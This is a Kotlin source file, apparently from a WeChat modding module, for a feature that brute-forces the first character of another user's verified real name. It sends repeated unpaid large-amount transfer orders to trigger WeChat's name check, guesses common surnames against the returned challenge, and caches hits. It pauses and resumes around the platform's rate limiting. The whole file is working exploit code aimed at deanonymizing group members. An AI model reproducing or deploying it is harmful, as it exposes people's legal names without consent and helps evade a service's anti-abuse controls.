package dev.ujhhgtg.wekit.features.items.chat

import android.app.Activity
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.LinearWavyProgressIndicator
import androidx.compose.material3.Text
import androidx.compose.material3.TextField
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.MutableIntState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.input.KeyboardType
import dev.ujhhgtg.wekit.features.api.core.WeDatabaseApi
import dev.ujhhgtg.wekit.features.api.net.WeTransferApi
import dev.ujhhgtg.wekit.features.api.net.WeTransferApi.fetchBeforeTransfer
import dev.ujhhgtg.wekit.features.api.net.WeTransferApi.sendPlaceOrder
import dev.ujhhgtg.wekit.features.api.ui.WeContactPrefsScreenApi
import dev.ujhhgtg.wekit.features.core.Feature
import dev.ujhhgtg.wekit.features.core.FeatureCategoryIds
import dev.ujhhgtg.wekit.features.core.SwitchFeature
import dev.ujhhgtg.wekit.ui.content.AlertDialogContent
import dev.ujhhgtg.wekit.ui.content.Button
import dev.ujhhgtg.wekit.ui.content.DefaultColumn
import dev.ujhhgtg.wekit.ui.content.TextButton
import dev.ujhhgtg.wekit.ui.utils.ShowComposeDialogScope
import dev.ujhhgtg.wekit.ui.utils.showComposeDialog
import dev.ujhhgtg.wekit.utils.WeLogger
import dev.ujhhgtg.wekit.utils.android.currentWxId
import dev.ujhhgtg.wekit.utils.fs.KnownPaths
import dev.ujhhgtg.wekit.utils.strings.isGroupChatWxId
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.serialization.ExperimentalSerializationApi
import kotlinx.serialization.json.Json
import java.util.concurrent.ConcurrentHashMap
import kotlin.io.path.div
import kotlin.io.path.exists
import kotlin.io.path.readText
import kotlin.io.path.writeText
import kotlin.time.Duration.Companion.seconds

@OptIn(ExperimentalSerializationApi::class)
@Feature(
    id = "爆破群成员实名首字",
    nameRes = "feature_brute_force_group_member_real_names_first_char_name",
    categoryIds = [FeatureCategoryIds.CHAT, FeatureCategoryIds.CONTACT_DETAILS],
    descriptionRes = "feature_brute_force_group_member_real_names_first_char_description",
)
object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
    WeContactPrefsScreenApi.IContactInfoProvider {

    private const val TAG = "BruteForceGroupMemberRealNamesFirstChar"
    private const val PREF_KEY = "exploit_real_name_first_char"

    /** WeChat's retcode for "姓名验证不正确" — i.e. the guessed [Char] was wrong. */
    private const val RETCODE_WRONG_NAME = "268502266"


    // ── Result cache ──────────────────────────────────────────────────────────

    private val cacheFile by lazy { KnownPaths.moduleData / "real_names_first_char.json" }

    /**
     * wxId → confirmed real-name first char. Only hits are stored.
     * Exposed so [DisplayGroupMemberRealName] can read it for combined display.
     */
    val realNames = ConcurrentHashMap<String, String>()

    private fun loadCache() {
        runCatching {
            val file = cacheFile
            if (!file.exists()) return
            val map = Json.decodeFromString<Map<String, String>>(file.readText())
            realNames.putAll(map)
            WeLogger.d(TAG, "loaded ${map.size} cached first chars")
        }.onFailure { WeLogger.w(TAG, "failed to load $cacheFile", it) }
    }

    private fun saveCache() {
        runCatching {
            cacheFile.writeText(Json.encodeToString(realNames.toMap()))
        }.onFailure { WeLogger.w(TAG, "failed to save $cacheFile", it) }
    }

    // ── Progress persistence (pause / resume) ─────────────────────────────────

    /**
     * Persists the index into [COMMON_SURNAMES] at which the next attempt should resume after
     * a rate-limit pause. Format: `Map<wxId, resumeIndex>`.
     *
     * Entries are written when a rate-limit retcode is encountered, and cleared on a confirmed
     * hit, manual cancellation, or loop exhaustion so stale progress never blocks a fresh run.
     */
    private val progressFile by lazy { KnownPaths.moduleData / "real_names_first_char_progress.json" }
    private val savedProgress = ConcurrentHashMap<String, Int>()

    private fun loadProgress() {
        runCatching {
            if (!progressFile.exists()) return
            val map = Json.decodeFromString<Map<String, Int>>(progressFile.readText())
            savedProgress.putAll(map)
            WeLogger.d(TAG, "loaded progress for ${map.size} members")
        }.onFailure { WeLogger.w(TAG, "failed to load $progressFile", it) }
    }

    private fun saveProgress(memberId: String, resumeIndex: Int) {
        runCatching {
            savedProgress[memberId] = resumeIndex
            progressFile.writeText(Json.encodeToString(savedProgress.toMap()))
        }.onFailure { WeLogger.w(TAG, "failed to save progress for $memberId", it) }
    }

    private fun clearProgress(memberId: String) {
        if (savedProgress.remove(memberId) != null) {
            runCatching {
                progressFile.writeText(Json.encodeToString(savedProgress.toMap()))
            }.onFailure { WeLogger.w(TAG, "failed to clear progress for $memberId", it) }
        }
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onEnable() {
        loadCache()
        loadProgress()
        WeContactPrefsScreenApi.addProvider(this)
    }

    override fun onDisable() {
        WeContactPrefsScreenApi.removeProvider(this)
    }

    // ── Contact-detail entry ──────────────────────────────────────────────────

    override fun getContactInfoItem(activity: Activity): List<WeContactPrefsScreenApi.PreferenceItem> {
        val memberId = activity.currentWxId ?: return emptyList()
        if (memberId.isGroupChatWxId) return emptyList()

        return listOf(
            WeContactPrefsScreenApi.PreferenceItem(
                key = PREF_KEY,
                title = "爆破群成员实名首字",
                summary = realNames[memberId]?.let { "首字: $it" } ?: "点击爆破",
                position = 1
            )
        )
    }

    override fun onItemClick(activity: Activity, key: String): Boolean {
        if (key != PREF_KEY) return false

        val memberId = activity.currentWxId ?: return true
        // Non-null only when the profile was opened from inside a group chat.
        // Null means a direct friend lookup — beforetransfer and transferplaceorder
        // both handle this case with groupId omitted.
        val groupId = activity.intent.getStringExtra("Contact_ChatRoomId")
            ?.takeIf { it.isNotEmpty() }

        showComposeDialog(activity) { ExploitDialog(memberId, groupId) }
        return true
    }

    // ── Brute-force orchestration ─────────────────────────────────────────────

    private sealed interface RunResult {
        /** Found the first char (and, if the challenge only asked for it, the whole revealed name). */
        data class Found(val char: String, val displayName: String) : RunResult

        /** Server said no name check is required for this transfer — nothing to brute-force. */
        data object NoCheckNeeded : RunResult
        data class Failed(val reason: String) : RunResult

        /** User aborted mid-run; carries how far we got. */
        data class Aborted(val tried: Int) : RunResult

        /**
         * Rate-limit retcode received. Progress was saved to disk; the next attempt will
         * resume from [resumeIndex] in [COMMON_SURNAMES].
         */
        data class Paused(val tried: Int, val resumeIndex: Int) : RunResult
    }

    private class RunState(
        val tried: MutableIntState,
        val total: Int,
        /** Absolute start index into [COMMON_SURNAMES] for this run (0 for fresh, >0 for resume). */
        val startIndex: Int = 0,
        @Volatile var cancelled: Boolean = false
    )

    /**
     * Full pipeline: beforetransfer → probe placeorder (to get the checkname challenge) → try each
     * surname as `input_name`, reusing the challenge's `checkname_sign`, until one is accepted.
     *
     * The loop starts at [RunState.startIndex] so that a paused run can resume from where it left
     * off. On a confirmed rate-limit retcode (unexpected, not [RETCODE_WRONG_NAME]), progress is
     * saved and [RunResult.Paused] is returned so the user can restart cleanly later.
     */
    private suspend fun runBruteForce(
        memberId: String,
        groupId: String?,
        amountYuan: Double,
        state: RunState
    ): RunResult {
        val before = fetchBeforeTransfer(memberId, groupId)
            ?: return RunResult.Failed("beforetransfer 失败 (可能被删除/拉黑/账号异常)")
        val maskedRealName = before.maskedRealName
            ?: return RunResult.Failed("CGI 未返回实名尾字")
        val key = before.key ?: return RunResult.Failed("CGI 未返回 truename_extend 密钥")

        val contact = WeDatabaseApi.getFriend(memberId)
        val nickname = contact?.let { it.remarkName.ifEmpty { it.nickname } } ?: memberId

        val ctx = WeTransferApi.TransferContext(
            memberId = memberId,
            groupId = groupId,
            maskedRealName = maskedRealName,
            truenameExtend = key,
            nickname = nickname,
            amountYuan = amountYuan,
            placeorderReserves = System.currentTimeMillis().toString()
        )

        // Probe: no input_name / checkname_sign → server returns the namemessage challenge.
        val probe = sendPlaceOrder(ctx, inputName = null, checknameSign = null)
            ?: return RunResult.Failed("下单探测请求超时")

        WeLogger.i(TAG, "probe response: $probe")

        val needCheckName = probe.optInt("need_checkname", 0)
        if (needCheckName != 1) {
            clearProgress(memberId)
            return RunResult.NoCheckNeeded
        }

        val nameMessage = probe.optJSONObject("namemessage")
            ?: return RunResult.Failed("响应缺少 namemessage")
        val checknameSign = nameMessage.optString("checkname_sign")
        val displayName = nameMessage.optString("display_name")
        if (checknameSign.isNullOrEmpty()) {
            return RunResult.Failed("响应缺少 checkname_sign")
        }
        WeLogger.i(TAG, "challenge: display_name='$displayName', sign=$checknameSign (startIndex=${state.startIndex})")

        // Resume from saved index so rate-limited runs don't retry already-eliminated candidates
        for ((index, candidate) in COMMON_SURNAMES.withIndex().drop(state.startIndex)) {
            if (state.cancelled) {
                clearProgress(memberId)
                return RunResult.Aborted(index - state.startIndex)
            }

            val resp = sendPlaceOrder(ctx, inputName = candidate, checknameSign = checknameSign)
            state.tried.intValue = index - state.startIndex + 1

            if (resp == null) {
                WeLogger.w(TAG, "guess '$candidate' timed out, continuing")
                delay(2.seconds)
                continue
            }

            val retcode = resp.optString("retcode")
            WeLogger.d(TAG, "guess '$candidate' → retcode=$retcode")

            when {
                retcode == RETCODE_WRONG_NAME -> {
                    // Wrong first char — keep going (rate-limit friendly delay)
                    delay(2.seconds)
                }

                retcode.isNullOrEmpty() || retcode == "0" -> {
                    realNames[memberId] = candidate
                    saveCache()
                    clearProgress(memberId)
                    return RunResult.Found(candidate, displayName)
                }

                else -> {
                    // Unexpected retcode: risk control kicked in. Save progress so the user
                    // can resume from this exact candidate after the cooldown period.
                    WeLogger.w(TAG, "rate-limit retcode=$retcode at index=$index ('$candidate'), saving progress")
                    saveProgress(memberId, index)
                    return RunResult.Paused(tried = index - state.startIndex + 1, resumeIndex = index)
                }
            }
        }

        clearProgress(memberId)
        return RunResult.Failed("已尝试全部 ${COMMON_SURNAMES.size} 个常见姓氏, 未命中")
    }

    // ── Dialog ────────────────────────────────────────────────────────────────

    private sealed interface Phase {
        data object Idle : Phase
        data class Running(val state: RunState) : Phase
        data class Done(val result: RunResult) : Phase
    }

    @Composable
    private fun ShowComposeDialogScope.ExploitDialog(
        memberId: String,
        groupId: String?
    ) {
        var phase by remember { mutableStateOf<Phase>(Phase.Idle) }
        var amountInput by remember { mutableStateOf("100000") }

        // Read saved progress once at composition time; stable for the dialog lifetime
        val resumeIndex = remember { savedProgress[memberId] }
        val remaining = remember(resumeIndex) {
            if (resumeIndex != null) COMMON_SURNAMES.size - resumeIndex else COMMON_SURNAMES.size
        }

        LaunchedEffect(phase) {
            val current = phase
            if (current is Phase.Running) {
                dialog.setCancelable(false)
                CoroutineScope(Dispatchers.IO).launch {
                    val amount = amountInput.toDoubleOrNull()?.takeIf { it > 0 } ?: 100000.0
                    val result = runBruteForce(memberId, groupId, amount, current.state)
                    if (phase is Phase.Running) {
                        phase = Phase.Done(result)
                        dialog.setCancelable(true)
                    }
                }
            }
        }

        AlertDialogContent(
            title = { Text(if (phase is Phase.Idle) "警告" else "爆破群成员实名首字") },
            text = {
                DefaultColumn(Modifier.verticalScroll(rememberScrollState())) {
                    when (val current = phase) {
                        is Phase.Idle -> {
                            Text(
                                "此功能会以设定金额向该成员发起多次转账下单请求 (仅下单, 不会真正扣款), " +
                                        "逐一尝试实名首字. 可能触发微信风控, 风险自负.\n\n" +
                                        "金额需足够大以触发姓名校验 (默认 10 万元). 与「显示群成员实名尾字」配合可拼出姓名."
                            )
                            if (resumeIndex != null) {
                                Text(
                                    "检测到上次因风控暂停的进度 (已尝试 ${COMMON_SURNAMES.size - remaining}/${COMMON_SURNAMES.size}, " +
                                            "将从「${COMMON_SURNAMES[resumeIndex]}」继续). 点击「继续」恢复上次进度, 或点击「重新开始」从头开始."
                                )
                            }
                            TextField(
                                value = amountInput,
                                onValueChange = { amountInput = it.filter { c -> c.isDigit() }.take(7) },
                                label = { Text("转账金额 (元)") },
                                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                                singleLine = true
                            )
                        }

                        is Phase.Running -> {
                            val tried by current.state.tried
                            val total = current.state.total
                            Text("正在尝试, 请稍等...\n已尝试: $tried/$total")
                            LinearWavyProgressIndicator(progress = { if (total == 0) 0f else tried.toFloat() / total })
                        }

                        is Phase.Done -> when (val r = current.result) {
                            is RunResult.Found ->
                                Text("命中! 实名首字为「${r.char}」\n\n校验掩码: ?${r.displayName}")

                            RunResult.NoCheckNeeded ->
                                Text("该成员无需姓名校验即可转账 (无法通过此方式获取首字)")

                            is RunResult.Failed ->
                                Text("失败: ${r.reason}")

                            is RunResult.Aborted ->
                                Text("已终止 (尝试了 ${r.tried} 个)")

                            is RunResult.Paused ->
                                Text(
                                    "已暂停 (触发风控, 尝试了 ${r.tried} 个). " +
                                            "进度已保存, 下次打开将从「${COMMON_SURNAMES[r.resumeIndex]}」继续."
                                )
                        }
                    }
                }
            },
            confirmButton = {
                when (phase) {
                    is Phase.Idle -> {
                        if (resumeIndex != null) {
                            // Two buttons when there is saved progress: resume (primary) and restart
                            Button(onClick = {
                                phase = Phase.Running(
                                    RunState(mutableIntStateOf(0), remaining, startIndex = resumeIndex)
                                )
                            }) { Text("继续 (${COMMON_SURNAMES.size - remaining + 1}/${COMMON_SURNAMES.size})") }
                        } else {
                            Button(onClick = {
                                phase = Phase.Running(
                                    RunState(mutableIntStateOf(0), COMMON_SURNAMES.size)
                                )
                            }) { Text("开始") }
                        }
                    }

                    is Phase.Done -> Button(onDismiss) { Text("关闭") }
                    else -> {}
                }
            },
            dismissButton = {
                when (val current = phase) {
                    is Phase.Idle -> {
                        if (resumeIndex != null) {
                            // "重新开始" clears saved progress and runs from index 0
                            TextButton(onClick = {
                                clearProgress(memberId)
                                phase = Phase.Running(
                                    RunState(mutableIntStateOf(0), COMMON_SURNAMES.size)
                                )
                            }) { Text("重新开始") }
                        } else {
                            TextButton(onDismiss) { Text("取消") }
                        }
                    }

                    is Phase.Running -> TextButton(onClick = { current.state.cancelled = true }) { Text("终止") }
                    is Phase.Done -> {}
                }
            }
        )
    }
}
